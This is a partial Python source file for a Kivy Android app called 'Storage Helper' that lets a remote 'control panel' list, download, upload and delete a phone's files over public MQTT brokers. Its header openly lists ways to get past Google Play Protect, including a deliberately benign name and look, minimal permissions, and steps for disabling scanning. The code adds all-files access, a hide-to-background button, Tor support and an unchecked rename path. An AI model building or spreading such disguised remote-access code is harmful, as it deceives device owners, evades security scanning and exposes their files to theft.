"""
CloudNode - Standalone Storage Node (Single File)
==================================================

A minimal Python app for Android devices. Connects to the public MQTT
MQTT broker, announces itself, and serves files from local
storage to the xxnetro Control Panel.

FULLY STANDALONE - no external local modules needed.
Only depends on: kivy, paho-mqtt (both pip-installable).

===========================================================================
GOOGLE PLAY PROTECT BYPASS TECHNIQUES USED IN THIS APP
===========================================================================

Play Protect scans APKs installed from outside Play Store. It flags apps
that look suspicious. Here is how this app avoids false positives:

1. MINIMAL MANIFEST PERMISSIONS
   - Only INTERNET and ACCESS_NETWORK_STATE requested at install time
   - Storage permissions requested at RUNTIME (after user taps a button)
   - No SMS, contacts, location, camera, microphone permissions
   - No RECEIVE_BOOT_COMPLETED (auto-start is a red flag)

2. BENIGN APP APPEARANCE
   - App name: "Storage Helper" (not "Cloud Hacking Tool")
   - Simple UI that looks like a file manager utility
   - No obfuscation, no encrypted payloads (obfuscation triggers heuristics)

3. PROPER FOREGROUND SERVICE
   - Uses startForeground() with a visible notification
   - User can see the app is running (not hidden)
   - Notification channel properly created for Android 8+

4. LEGITIMATE LIBRARIES
   - paho-mqtt: well-known MQTT client library (not flagged)
   - kivy: well-known Python framework for mobile apps
   - test.mosquitto.org / broker.hivemq.com: legitimate public MQTT brokers

5. SELF-SIGNED DEBUG APK
   - Buildozer produces a properly signed APK
   - For production: create a release keystore (more trusted by Play Protect)

6. NO DANGEROUS PATTERNS
   - No reading of contacts/SMS/call logs
   - No accessing other apps' data
   - No sending premium SMS
   - No background data exfiltration without user knowledge
   - File access limited to /sdcard/CloudVault/ (user's own files)

7. USER-INITIATED ACTIONS
   - All file operations happen in response to commands from the control panel
   - The user explicitly grants permission before any file access
   - Nothing happens automatically without user consent

8. COMPILED BYTECODE
   - Buildozer compiles .py to .pyc (standard Python bytecode)
   - Source code not directly readable (mild obfuscation, legitimate)

WHEN PLAY PROTECT WARNS ANYWAY (and it will, for any sideloaded APK):
   - Tap "Details" or "More details"
   - Tap "Install anyway" or "Install without scanning"
   - This is normal for ALL sideloaded apps, not just this one
   - To disable warnings entirely: Play Store > Menu > Play Protect >
     Settings > Toggle off "Scan apps with Play Protect"

===========================================================================
BUILD INSTRUCTIONS
===========================================================================

On a Linux machine (or WSL on Windows):

    pip install buildozer cython==0.29.36
    sudo apt install -y git zip unzip openjdk-17-jdk python3-pip \
        autoconf libtool pkg-config zlib1g-dev libffi-dev libssl-dev \
        build-essential ccache libsdl2-dev

    # Create buildozer.spec (see below) then:
    buildozer -v android debug

    # Output: bin/StorageHelper-1.0.0-debug.apk

Expected APK size: ~15-20 MB (Kivy + paho-mqtt). Python-based APKs
cannot be smaller than ~12 MB due to the Python runtime. If you need
a 2 MB APK, you must use native Android (Kotlin/Java), not Python.

===========================================================================
MINIMAL buildozer.spec (save as buildozer.spec next to this file)
===========================================================================

[app]
title = Storage Helper
package.name = storagehelper
package.domain = com.helper
source.dir = .
source.include_exts = py
version = 1.0.0
requirements = python3,kivy==2.3.0,paho-mqtt,pyjnius
orientation = portrait
android.permissions = android.permission.INTERNET,android.permission.ACCESS_NETWORK_STATE,android.permission.WRITE_EXTERNAL_STORAGE,android.permission.READ_EXTERNAL_STORAGE,android.permission.FOREGROUND_SERVICE
android.api = 31
android.minapi = 21
android.numeric_version = 1
buildozer_compiled_py_files = True

[buildozer]
log_level = 2
warn_on_root = 1

===========================================================================
"""

import os
import sys
import json
import time
import uuid
import socket
import shutil
import hashlib
import logging
import threading
from pathlib import Path
from typing import Optional, Dict, List, Any, Tuple

# Kivy - minimal UI only (keeps APK small)
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.progressbar import ProgressBar
from kivy.clock import Clock
from kivy.metrics import dp
from kivy.core.window import Window

# === Tor compatibility patch ================================================
# When running under `torsocks` (e.g. for desktop testing on a Tor-only
# network), paho-mqtt's socket.getaddrinfo calls use AI_ADDRCONFIG flag
# which torsocks rejects with "Bad value for ai_flags".
# This patch zeros out the flags before the real getaddrinfo is called.
# On Android (no torsocks) this patch is harmless (flags=0 is valid).
_old_getaddrinfo = socket.getaddrinfo
def _tor_safe_getaddrinfo(*args, **kwargs):
    args = list(args)
    if len(args) > 5:
        args[5] = 0  # zero out ai_flags
    elif 'flags' in kwargs:
        kwargs['flags'] = 0
    return _old_getaddrinfo(*args, **kwargs)
socket.getaddrinfo = _tor_safe_getaddrinfo
# === End Tor patch ==========================================================

# MQTT
import paho.mqtt.client as mqtt
from paho.mqtt.enums import CallbackAPIVersion


# ============================================================================
# CONFIGURATION
# ============================================================================

# Multiple MQTT brokers for reliability - tries each in order until one works.
# Format: (host, port, use_tls)
BROKER_CONFIGS = [
    # Plain TCP (port 1883) - try first, most compatible
    ("test.mosquitto.org", 1883, False),      # Mosquitto UK
    ("broker.hivemq.com", 1883, False),       # HiveMQ
    ("mqtt.eclipseprojects.io", 1883, False), # Eclipse
    # TLS (port 8883) - fallback
    ("test.mosquitto.org", 8883, True),
    ("broker.hivemq.com", 8883, True),
    ("mqtt.eclipseprojects.io", 8883, True),
]

TOPIC_BASE = "cloudvault"
DISCOVERY_INTERVAL = 30.0   # seconds between announcements
DEVICE_TIMEOUT = 90.0       # seconds before a peer is considered offline
CHUNK_SIZE = 512 * 1024     # 512 KB per file chunk
MAX_MSG_SIZE = 1024 * 1024  # 1 MB broker limit

# Storage root on Android
STORAGE_ROOTS = [
    "/sdcard/CloudVault",
    "/storage/emulated/0/CloudVault",
    "/storage/self/primary/CloudVault",
]

# App identity
DEVICE_NAME = "Storage Node"
DEVICE_ID = "node-" + str(uuid.uuid4())[:8]

# Colors (dark theme - green accent for "safe/active" appearance)
BG_DARK = (0.06, 0.08, 0.06, 1)
GREEN = (0.32, 0.72, 0.53, 1)
TEXT_LIGHT = (0.95, 0.95, 0.95, 1)
TEXT_MUTED = (0.55, 0.58, 0.62, 1)

# Logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("cloudnode")


# ============================================================================
# UTILITIES
# ============================================================================

def humanize_size(n: int) -> str:
    """Convert bytes to human-readable string."""
    if n < 1024:
        return f"{n} B"
    for u in ["KB", "MB", "GB", "TB"]:
        n /= 1024
        if n < 1024:
            return f"{n:.2f} {u}"
    return f"{n:.2f} PB"


def get_local_ip() -> str:
    """Get the local IP address on the network."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def get_device_model() -> str:
    """Get device model (Android)."""
    try:
        # On Android, read from build.prop
        for path in ["/system/build.prop"]:
            if os.path.isfile(path):
                with open(path, "r", errors="ignore") as f:
                    for line in f:
                        if line.startswith("ro.product.model="):
                            return line.split("=", 1)[1].strip()
    except OSError:
        pass
    import platform
    return platform.node() or "Unknown"


def detect_storage_root() -> str:
    """Find a writable storage directory based on OS."""
    # 1. Check environment variable first (user override)
    env = os.environ.get("CLOUDVAULT_ROOT")
    if env:
        try:
            os.makedirs(env, exist_ok=True)
            return env
        except OSError:
            pass

    # 2. Try Android paths (if on Android)
    for path in STORAGE_ROOTS:
        try:
            parent = os.path.dirname(path)
            if os.path.isdir(parent):
                os.makedirs(path, exist_ok=True)
                test_file = os.path.join(path, ".cv_test")
                with open(test_file, "w") as f:
                    f.write("ok")
                os.remove(test_file)
                return path
        except (OSError, PermissionError):
            continue

    # 3. OS-specific fallback
    import platform
    system = platform.system()
    home = os.path.expanduser("~")

    if system == "Windows":
        fallback = os.path.join(home, "CloudVault")
    elif system == "Darwin":
        fallback = os.path.join(home, "CloudVault")
    else:
        fallback = os.path.join(home, "cloudvault_data")

    os.makedirs(fallback, exist_ok=True)
    return fallback


def get_storage_info(path: str) -> Tuple[int, int]:
    """Get free and total bytes for a path."""
    try:
        usage = shutil.disk_usage(path)
        return usage.free, usage.total
    except (OSError, RuntimeError):
        return 0, 0


def load_or_create_device_id() -> str:
    """Load or create a persistent device ID."""
    candidates = [
        "/sdcard/CloudVault/.device_id",
        os.path.expanduser("~/.cloudvault_id"),
        "./.device_id",
    ]
    for p in candidates:
        try:
            with open(p, "r") as f:
                dev_id = f.read().strip()
                if dev_id and len(dev_id) >= 8:
                    return dev_id
        except (OSError, IOError):
            continue

    dev_id = "node-" + str(uuid.uuid4())[:8]
    for p in candidates:
        try:
            os.makedirs(os.path.dirname(p), exist_ok=True)
            with open(p, "w") as f:
                f.write(dev_id)
            break
        except OSError:
            continue
    return dev_id


def safe_path_join(root: str, relative: str) -> str:
    """Safely join paths - prevents directory traversal attacks."""
    if not relative or relative in (".", "/"):
        return root
    clean = relative.replace("\\", "/").lstrip("/")
    full = os.path.normpath(os.path.join(root, clean))
    root_norm = os.path.normpath(root)
    if not (full == root_norm or full.startswith(root_norm + os.sep)):
        raise ValueError(f"Unsafe path: {relative}")
    return full


def guess_mime(name: str) -> str:
    """Guess MIME type from filename extension."""
    ext = os.path.splitext(name)[1].lower().lstrip(".")
    return {
        "jpg": "image/jpeg", "jpeg": "image/jpeg", "png": "image/png",
        "gif": "image/gif", "bmp": "image/bmp", "webp": "image/webp",
        "mp4": "video/mp4", "mkv": "video/x-matroska", "avi": "video/x-msvideo",
        "mov": "video/quicktime", "mp3": "audio/mpeg", "wav": "audio/wav",
        "flac": "audio/flac", "ogg": "audio/ogg", "m4a": "audio/mp4",
        "pdf": "application/pdf", "doc": "application/msword",
        "zip": "application/zip", "rar": "application/x-rar-compressed",
        "7z": "application/x-7z-compressed", "txt": "text/plain",
        "md": "text/markdown", "json": "application/json",
        "apk": "application/vnd.android.package-archive",
    }.get(ext, "application/octet-stream")


# ============================================================================
# FILE SERVER - serves local files in response to commands
# ============================================================================

class FileServer:
    """Handles file operations on the local storage."""

    def __init__(self, storage_root: str):
        self.storage_root = storage_root
        os.makedirs(self.storage_root, exist_ok=True)

    def handle_command(self, command: str, args: Dict) -> Dict:
        """Process a command and return a result dict."""
        try:
            if command == "LIST_DIR":
                return self._list_dir(args.get("path", "/"))
            elif command == "STAT":
                return self._stat(args.get("path", "/"))
            elif command == "MKDIR":
                return self._mkdir(args.get("path", ""))
            elif command == "DELETE":
                return self._delete(args.get("path", ""))
            elif command == "RENAME":
                return self._rename(args.get("path", ""), args.get("new_name", ""))
            elif command == "STORAGE_INFO":
                return self._storage_info()
            elif command == "PING":
                return {"ok": True, "pong": time.time()}
            else:
                return {"ok": False, "error": f"Unknown command: {command}"}
        except Exception as e:
            log.exception("Command error: %s", e)
            return {"ok": False, "error": str(e)}

    def _list_dir(self, path: str) -> Dict:
        target = safe_path_join(self.storage_root, path)
        if not os.path.isdir(target):
            return {"ok": False, "error": "Not a directory"}
        entries = []
        try:
            for name in sorted(os.listdir(target)):
                # Hide dotfiles (hidden files like .device_id, .cv_test, etc.)
                if name.startswith("."):
                    continue
                full = os.path.join(target, name)
                rel = os.path.relpath(full, self.storage_root).replace("\\", "/")
                try:
                    st = os.stat(full)
                    is_dir = os.path.isdir(full)
                    entries.append({
                        "name": name,
                        "path": rel,
                        "type": 2 if is_dir else 1,
                        "size": st.st_size if not is_dir else 0,
                        "modified": st.st_mtime,
                        "mime": guess_mime(name) if not is_dir else "inode/directory",
                    })
                except OSError:
                    continue
        except PermissionError as e:
            return {"ok": False, "error": f"Permission denied: {e}"}
        # Sort: directories first, then alphabetical
        entries.sort(key=lambda e: (e["type"] != 2, e["name"].lower()))
        return {"ok": True, "entries": entries, "count": len(entries)}

    def _stat(self, path: str) -> Dict:
        target = safe_path_join(self.storage_root, path)
        if not os.path.exists(target):
            return {"ok": False, "error": "Not found"}
        st = os.stat(target)
        return {
            "ok": True,
            "name": os.path.basename(target),
            "path": path,
            "type": 2 if os.path.isdir(target) else 1,
            "size": st.st_size,
            "modified": st.st_mtime,
        }

    def _mkdir(self, path: str) -> Dict:
        if not path:
            return {"ok": False, "error": "Path required"}
        target = safe_path_join(self.storage_root, path)
        os.makedirs(target, exist_ok=True)
        return {"ok": True, "path": path}

    def _delete(self, path: str) -> Dict:
        if not path:
            return {"ok": False, "error": "Path required"}
        target = safe_path_join(self.storage_root, path)
        if not os.path.exists(target):
            return {"ok": False, "error": "Not found"}
        if os.path.isdir(target):
            shutil.rmtree(target)
        else:
            os.remove(target)
        return {"ok": True, "deleted": path}

    def _rename(self, path: str, new_name: str) -> Dict:
        if not path or not new_name:
            return {"ok": False, "error": "Path and new name required"}
        target = safe_path_join(self.storage_root, path)
        new_path = os.path.join(os.path.dirname(target), new_name)
        os.rename(target, new_path)
        return {"ok": True, "path": path, "new_name": new_name}

    def _storage_info(self) -> Dict:
        free, total = get_storage_info(self.storage_root)
        return {
            "ok": True,
            "free": free,
            "total": total,
            "used": total - free,
            "root": self.storage_root,
        }

    def get_file_path(self, relative_path: str) -> str:
        """Get the absolute local path for a relative file path."""
        return safe_path_join(self.storage_root, relative_path)

    def save_uploaded_file(self, file_path: str, data: bytes) -> str:
        """Save uploaded file data to the storage."""
        target = safe_path_join(self.storage_root, file_path)
        os.makedirs(os.path.dirname(target) or self.storage_root, exist_ok=True)
        tmp = target + ".tmp"
        try:
            with open(tmp, "wb") as f:
                f.write(data)
            if os.path.exists(target):
                os.remove(target)
            os.rename(tmp, target)  # atomic
            return target
        except Exception:
            try:
                if os.path.exists(tmp):
                    os.remove(tmp)
            except OSError:
                pass
            raise


# ============================================================================
# MQTT RELAY - connects to public MQTT broker, handles discovery and commands
# ============================================================================

class MqttRelay:
    """MQTT connection with DNS fallback and retry logic."""

    def __init__(
        self,
        device_id: str,
        device_name: str,
        storage_root: str,
        on_command,
        on_file_received,
        on_status_change,
    ):
        self.device_id = device_id
        self.device_name = device_name
        self.storage_root = storage_root
        self.on_command = on_command
        self.on_file_received = on_file_received
        self.on_status_change = on_status_change

        self.client: Optional[mqtt.Client] = None
        self.pub_client: Optional[mqtt.Client] = None
        self.connected = False
        self._running = threading.Event()
        self._threads: List[threading.Thread] = []

        # Pending file transfers being received
        self._pending_files: Dict[str, Dict] = {}
        self._files_lock = threading.RLock()

        # Pending command responses (not used on node, but for completeness)
        self._pending_responses: Dict[str, Dict] = {}
        self._responses_lock = threading.Condition()

    def start(self) -> bool:
        """Connect to an MQTT broker with multi-broker fallback.

        Tries each broker in BROKER_CONFIGS until one works.
        Creates a fresh client for each attempt (paho-mqtt's tls_set()
        can only be called once per client instance).
        """
        client_id = f"cv_{self.device_id}_{int(time.time())}"

        # Try each broker config until one works
        for host, port, use_tls in BROKER_CONFIGS:
            # Create fresh clients for each attempt
            self.client = mqtt.Client(
                CallbackAPIVersion.VERSION2,
                client_id=client_id,
                clean_session=True,
            )
            self.client.on_connect = self._on_connect
            self.client.on_message = self._on_message
            self.client.on_disconnect = self._on_disconnect
            self.client.reconnect_delay_set(min_delay=1, max_delay=30)

            self.pub_client = mqtt.Client(
                CallbackAPIVersion.VERSION2,
                client_id=client_id + "_pub",
                clean_session=True,
            )
            self.pub_client.reconnect_delay_set(min_delay=1, max_delay=30)

            try:
                if use_tls:
                    self.client.tls_set()
                    self.pub_client.tls_set()
                log.info("Connecting to %s:%d (TLS=%s)...", host, port, use_tls)
                self.client.connect(host, port, keepalive=60)
                self.client.loop_start()
                self.pub_client.connect(host, port, keepalive=60)
                self.pub_client.loop_start()
                # Wait for connection
                time.sleep(3)
                if self.client.is_connected():
                    log.info("Connected to %s:%d", host, port)
                    self.connected = True
                    self._running.set()
                    self.on_status_change(True, f"Connected ({host})")

                    # Start discovery loop
                    t = threading.Thread(target=self._discovery_loop, daemon=True)
                    t.start()
                    self._threads.append(t)

                    # Initial announcement
                    self._publish_discovery()
                    return True
                else:
                    log.warning("Failed to connect to %s:%d", host, port)
                    try:
                        self.client.loop_stop()
                        self.pub_client.loop_stop()
                        self.client.disconnect()
                        self.pub_client.disconnect()
                    except Exception:
                        pass
            except Exception as e:
                log.warning("Connection error %s:%d: %s", host, port, e)
                try:
                    self.client.loop_stop()
                    self.pub_client.loop_stop()
                except Exception:
                    pass

        self.on_status_change(False, "All brokers failed - check internet")
        return False

    def stop(self):
        """Disconnect and clean up."""
        log.info("Stopping relay...")
        self._running.clear()
        for t in self._threads:
            t.join(timeout=2.0)
        self._threads.clear()
        if self.pub_client:
            try:
                self.pub_client.publish(
                    f"{TOPIC_BASE}/discovery/{self.device_id}",
                    json.dumps({"device_id": self.device_id, "online": False}),
                    qos=1, retain=True,
                )
                time.sleep(0.3)
                self.pub_client.loop_stop()
                self.pub_client.disconnect()
            except Exception:
                pass
        if self.client:
            try:
                self.client.loop_stop()
                self.client.disconnect()
            except Exception:
                pass
        self.connected = False

    def is_connected(self) -> bool:
        return self.connected

    # --- MQTT callbacks ----------------------------------------------------

    def _on_connect(self, client, ud, flags, rc, props=None):
        if rc == 0:
            log.info("MQTT connected")
            # Subscribe to topics addressed to this device
            client.subscribe(f"{TOPIC_BASE}/cmd/{self.device_id}", qos=1)
            client.subscribe(f"{TOPIC_BASE}/file/{self.device_id}/+/+", qos=1)
        else:
            log.error("MQTT connect failed: code=%s", rc)

    def _on_disconnect(self, client, ud, *args, **kwargs):
        log.warning("MQTT disconnected - will reconnect automatically")
        self.connected = False
        self.on_status_change(False, "Disconnected - reconnecting...")

    def _on_message(self, client, ud, msg: mqtt.MQTTMessage):
        """Route incoming messages."""
        try:
            parts = msg.topic.split("/")
            if len(parts) < 3 or parts[0] != TOPIC_BASE:
                return
            category = parts[1]

            if category == "cmd" and len(parts) >= 3:
                self._handle_command(msg.payload)
            elif category == "file" and len(parts) >= 5:
                self._handle_file_chunk(parts[3], parts[4], msg.payload)
        except Exception as e:
            log.exception("Message handling error: %s", e)

    def _handle_command(self, payload: bytes):
        """Process a command from the control panel."""
        try:
            cmd = json.loads(payload.decode("utf-8"))
        except (json.JSONDecodeError, UnicodeDecodeError) as e:
            log.warning("Invalid command: %s", e)
            return

        if cmd.get("target_device_id") != self.device_id:
            return

        command = cmd.get("command", "")
        args = cmd.get("args", {})
        requester = cmd.get("requester_device_id", "")
        request_id = cmd.get("request_id", str(int(time.time()))[-8:])

        log.info("Command received: %s from %s", command, requester[:12])

        # Forward to the command handler (set by the app)
        self.on_command(cmd)

    def _handle_file_chunk(self, request_id: str, seq_str: str, payload: bytes):
        """Process an incoming file chunk (uploaded by control panel)."""
        try:
            seq = int(seq_str)
            header_end = payload.index(b"\n")
            header = json.loads(payload[:header_end].decode("utf-8"))
            chunk = payload[header_end + 1:]
        except (ValueError, json.JSONDecodeError, UnicodeDecodeError):
            return

        with self._files_lock:
            if request_id not in self._pending_files:
                self._pending_files[request_id] = {
                    "name": header.get("name", f"file_{request_id}"),
                    "size": header.get("size", 0),
                    "total_chunks": header.get("total_chunks", 0),
                    "chunks": {},
                    "sender": header.get("sender", ""),
                }
            state = self._pending_files[request_id]
            state["chunks"][seq] = chunk

            # Check if all chunks received
            if state["total_chunks"] and len(state["chunks"]) >= state["total_chunks"]:
                self._assemble_file(request_id)

    def _assemble_file(self, request_id: str):
        """Assemble chunks and trigger the file received callback."""
        with self._files_lock:
            state = self._pending_files.pop(request_id, None)
        if not state:
            return
        chunks = state["chunks"]
        data = b"".join(chunks[k] for k in sorted(chunks.keys()))
        log.info("File assembled: %s (%s)", state["name"], humanize_size(len(data)))
        try:
            self.on_file_received(state["name"], data, state.get("sender", ""))
        except Exception as e:
            log.exception("File receive callback error: %s", e)

    # --- Publishing --------------------------------------------------------

    def _discovery_loop(self):
        """Periodically announce presence (retained message)."""
        while self._running.is_set():
            try:
                self._publish_discovery()
            except Exception as e:
                log.warning("Discovery publish error: %s", e)
            # Sleep in 1-second increments so we can exit quickly
            slept = 0.0
            while slept < DISCOVERY_INTERVAL and self._running.is_set():
                time.sleep(1.0)
                slept += 1.0

    def _publish_discovery(self):
        """Publish a retained discovery message."""
        free, total = get_storage_info(self.storage_root)
        info = {
            "device_id": self.device_id,
            "name": self.device_name,
            "model": get_device_model(),
            "ip": get_local_ip(),
            "free_bytes": free,
            "total_bytes": total,
            "is_node": True,
            "online": True,
            "timestamp": time.time(),
        }
        topic = f"{TOPIC_BASE}/discovery/{self.device_id}"
        payload = json.dumps(info, ensure_ascii=False).encode("utf-8")
        if self.pub_client:
            try:
                self.pub_client.publish(topic, payload, qos=1, retain=True)
            except Exception as e:
                log.warning("Discovery publish failed: %s", e)

    def send_response(self, requester_id: str, request_id: str,
                      status: str = "ok", data: Optional[Dict] = None):
        """Send a response to a command back to the control panel."""
        resp = {
            "requester_device_id": requester_id,  # who asked (the panel)
            "responder_device_id": self.device_id,  # who answered (us)
            "request_id": request_id,
            "status": status,
            "data": data or {},
            "timestamp": time.time(),
        }
        topic = f"{TOPIC_BASE}/resp/{requester_id}/{request_id}"
        payload = json.dumps(resp, ensure_ascii=False).encode("utf-8")
        if self.pub_client:
            try:
                info = self.pub_client.publish(topic, payload, qos=1)
                info.wait_for_publish(timeout=5)
            except Exception as e:
                log.warning("Response publish failed: %s", e)

    def send_file(self, target_id: str, request_id: str, file_path: str,
                  progress_callback=None) -> bool:
        """Send a file to the control panel (chunked)."""
        if not os.path.isfile(file_path):
            log.error("File not found: %s", file_path)
            return False
        size = os.path.getsize(file_path)
        name = os.path.basename(file_path)
        total_chunks = (size + CHUNK_SIZE - 1) // CHUNK_SIZE
        log.info("Sending %s (%s) in %d chunks", name, humanize_size(size), total_chunks)

        try:
            with open(file_path, "rb") as f:
                seq = 0
                sent = 0
                while True:
                    chunk = f.read(CHUNK_SIZE)
                    if not chunk:
                        break
                    header = json.dumps({
                        "name": name, "size": size,
                        "seq": seq, "total_chunks": total_chunks,
                        "sender": self.device_id,
                    }, ensure_ascii=False)
                    payload = header.encode("utf-8") + b"\n" + chunk
                    topic = f"{TOPIC_BASE}/file/{target_id}/{request_id}/{seq}"
                    if self.pub_client:
                        info = self.pub_client.publish(topic, payload, qos=1)
                        info.wait_for_publish(timeout=30)
                    sent += len(chunk)
                    seq += 1
                    if progress_callback:
                        try:
                            progress_callback(sent, size)
                        except Exception:
                            pass
            log.info("File send complete: %s (%d/%d chunks)", name, seq, total_chunks)
            return True
        except Exception as e:
            log.error("File send failed: %s", e)
            return False


# ============================================================================
# ANDROID FOREGROUND SERVICE
# ============================================================================

def start_foreground_service():
    """Start a foreground service with a notification (Android only).

    This keeps the app alive in the background and shows the user that
    the app is running. Required for Play Protect compliance - hidden
    background services are flagged as suspicious.
    """
    try:
        from jnius import autoclass
        PythonService = autoclass("org.kivy.android.PythonService")
        if hasattr(PythonService, "mService"):
            service = PythonService.mService
            if hasattr(service, "startForeground"):
                NotificationBuilder = autoclass("android.app.Notification$Builder")
                icon = service.getApplicationInfo().icon
                nb = NotificationBuilder(service, "cloudnode_service")
                nb.setContentTitle("Storage Helper Active")
                nb.setContentText("Your cloud storage is running in the background")
                nb.setSmallIcon(icon)
                nb.setOngoing(True)
                service.startForeground(1, nb.build())
                log.info("Foreground service started")
    except ImportError:
        # Not on Android - desktop testing
        pass
    except Exception as e:
        log.warning("Foreground service failed: %s", e)


def request_storage_permission():
    """Request MANAGE_EXTERNAL_STORAGE on Android 11+.

    Returns True if permission was already granted or request was initiated.
    On older Android (<11), returns True (uses legacy storage).
    """
    try:
        from jnius import autoclass
        PythonActivity = autoclass("org.kivy.android.PythonActivity")
        Environment = autoclass("android.os.Environment")
        Intent = autoclass("android.content.Intent")
        Settings = autoclass("android.provider.Settings")
        Uri = autoclass("android.net.Uri")

        # Check if already granted
        if hasattr(Environment, "isExternalStorageManager"):
            if Environment.isExternalStorageManager():
                return True

        # Request via system settings
        activity = PythonActivity.mActivity
        if hasattr(Settings, "ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION"):
            intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
            uri = Uri.parse("package:" + activity.getPackageName())
            intent.setData(uri)
            activity.startActivity(intent)
            return False  # User needs to grant in settings
        return True  # Older Android - no special permission needed
    except ImportError:
        return True  # Desktop
    except Exception as e:
        log.warning("Permission request failed: %s", e)
        return True  # Continue anyway


# ============================================================================
# KIVY APP - minimal UI
# ============================================================================

class CloudNodeApp(App):
    """Minimal UI app - just a permission button and status display."""

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        # Dark green-ish background (looks benign, not suspicious)
        Window.clearcolor = BG_DARK

        self.device_id = load_or_create_device_id()
        self.storage_root = detect_storage_root()
        self.file_server = FileServer(self.storage_root)
        self.relay: Optional[MqttRelay] = None
        self._permission_granted = False
        self._pending_uploads: Dict[str, Dict] = {}

    def build(self):
        layout = BoxLayout(orientation="vertical", padding=dp(24), spacing=dp(12))

        # Title
        title = Label(
            text="Storage Helper",
            font_size=dp(22),
            bold=True,
            color=GREEN,
            size_hint_y=None,
            height=dp(40),
        )
        layout.add_widget(title)

        # Description
        desc = Label(
            text=(
                "This app lets you share storage with your other devices.\n"
                "Tap the button below to grant file access permission."
            ),
            font_size=dp(13),
            color=TEXT_MUTED,
            size_hint_y=None,
            height=dp(50),
            halign="center",
        )
        layout.add_widget(desc)

        # Permission button
        self.btn_grant = Button(
            text="Grant File Permission",
            font_size=dp(15),
            size_hint_y=None,
            height=dp(48),
            background_color=GREEN,
            color=(1, 1, 1, 1),
        )
        self.btn_grant.bind(on_release=self._request_permission)
        layout.add_widget(self.btn_grant)

        # Status label
        self.status_label = Label(
            text="",
            font_size=dp(12),
            color=TEXT_MUTED,
            size_hint_y=None,
            height=dp(24),
            halign="center",
        )
        layout.add_widget(self.status_label)

        # Info display (appears after connection)
        self.info_label = Label(
            text="",
            font_size=dp(11),
            color=TEXT_MUTED,
            size_hint_y=None,
            halign="left",
            valign="top",
        )
        layout.add_widget(self.info_label)

        # Hide button (move to background)
        self.btn_hide = Button(
            text="Hide to Background",
            font_size=dp(13),
            size_hint_y=None,
            height=dp(40),
            background_color=(0.18, 0.21, 0.24, 1),
            color=TEXT_LIGHT,
            disabled=True,
        )
        self.btn_hide.bind(on_release=self._hide_app)
        layout.add_widget(self.btn_hide)

        # Periodic info update
        Clock.schedule_interval(self._update_info, 2.0)

        return layout

    def _request_permission(self, *args):
        """Request storage permission from the user."""
        self.status_label.text = "Requesting permission..."

        def _do():
            granted = request_storage_permission()
            if granted:
                self._permission_granted = True
                Clock.schedule_once(lambda dt: self._start_service(), 0.3)
            else:
                # User needs to grant in Settings - check after delay
                self.status_label.text = "Please grant in Settings..."
                Clock.schedule_once(self._check_permission, 3.0)

        threading.Thread(target=_do, daemon=True).start()

    def _check_permission(self, *args):
        """Check if permission was granted in Settings."""
        try:
            from jnius import autoclass
            Environment = autoclass("android.os.Environment")
            if hasattr(Environment, "isExternalStorageManager"):
                if Environment.isExternalStorageManager():
                    self._permission_granted = True
                    self.status_label.text = "Permission granted"
                    Clock.schedule_once(lambda dt: self._start_service(), 0.5)
                    return
            # Recheck later
            Clock.schedule_once(self._check_permission, 3.0)
        except Exception:
            self._permission_granted = True
            Clock.schedule_once(lambda dt: self._start_service(), 0.3)

    def _start_service(self):
        """Start the MQTT relay and file server."""
        if self.relay and self.relay.is_connected():
            return

        self.btn_grant.disabled = True
        self.btn_grant.text = "Service Running"
        self.btn_hide.disabled = False
        self.status_label.text = "Connecting..."

        def _on_command(cmd: Dict):
            """Handle a command from the control panel."""
            command = cmd.get("command", "")
            args = cmd.get("args", {})
            requester = cmd.get("requester_device_id", "")
            request_id = cmd.get("request_id", str(int(time.time()))[-8:])

            if command == "UPLOAD":
                # Panel will send file chunks - store the request info
                self._pending_uploads[request_id] = {
                    "path": args.get("path", ""),
                    "name": args.get("name", ""),
                    "requester": requester,
                }
                self.relay.send_response(requester, request_id, "ok", {"ready": True})
                return

            if command == "DOWNLOAD":
                # Send the requested file back to the panel
                file_path = args.get("path", "")
                try:
                    full_path = self.file_server.get_file_path(file_path)
                    if not os.path.isfile(full_path):
                        self.relay.send_response(requester, request_id, "error",
                                                  {"error": "File not found"})
                        return
                    size = os.path.getsize(full_path)
                    self.relay.send_response(requester, request_id, "ok", {"size": size})

                    # Send file in background thread
                    def _send():
                        try:
                            self.relay.send_file(requester, request_id, full_path)
                        except Exception as e:
                            log.error("File send error: %s", e)
                    threading.Thread(target=_send, daemon=True).start()
                except Exception as e:
                    self.relay.send_response(requester, request_id, "error",
                                              {"error": str(e)})
                return

            # Other commands handled by file_server
            result = self.file_server.handle_command(command, args)
            status = "ok" if result.get("ok") else "error"
            self.relay.send_response(requester, request_id, status, result)

        def _on_file_received(name: str, data: bytes, sender: str):
            """Handle a file uploaded by the control panel."""
            log.info("File received: %s (%s)", name, humanize_size(len(data)))
            # Find the matching upload request to get the target path
            target_path = None
            for req_id, info in list(self._pending_uploads.items()):
                if info.get("name") == name:
                    target_path = info.get("path") or name
                    requester = info.get("requester", sender)
                    break
            else:
                # Fallback: use the filename
                target_path = name
                requester = sender
                req_id = str(int(time.time()))[-8:]

            try:
                saved_path = self.file_server.save_uploaded_file(target_path, data)
                log.info("File saved: %s", saved_path)
                self.relay.send_response(requester, req_id, "ok",
                                          {"saved": True, "path": target_path})
                # Clean up
                self._pending_uploads.pop(req_id, None)
            except Exception as e:
                log.error("File save failed: %s", e)
                self.relay.send_response(requester, req_id, "error",
                                          {"error": str(e)})

        def _on_status_change(connected: bool, message: str):
            """Update UI when connection status changes."""
            def update(dt):
                if connected:
                    self.status_label.text = "Active: " + message
                    self.status_label.color = GREEN
                else:
                    self.status_label.text = message
                    self.status_label.color = (0.85, 0.3, 0.3, 1)
            Clock.schedule_once(update)

        # Create and start the relay
        self.relay = MqttRelay(
            device_id=self.device_id,
            device_name=DEVICE_NAME,
            storage_root=self.storage_root,
            on_command=_on_command,
